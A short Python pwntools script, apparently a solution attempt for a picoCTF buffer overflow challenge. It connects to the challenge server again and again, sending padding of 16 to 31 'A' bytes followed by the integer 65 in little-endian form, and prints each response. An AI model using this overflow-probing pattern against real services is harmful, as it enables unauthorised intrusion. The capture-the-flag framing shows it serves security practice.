#!/usr/bin/env python3
from pwn import remote

HOST = "saturn.picoctf.net"
PORT = 50517

for i in range(16,32):

    # Connect
    r = remote(HOST, PORT)

    # Build payload: 16 'A's + little-endian 65
    payload = b"A"*i + (65).to_bytes(4, byteorder='little')

    print(i)
    # Send and print
    r.sendlineafter("Enter a string: ", payload)
    print(r.recvall().decode())
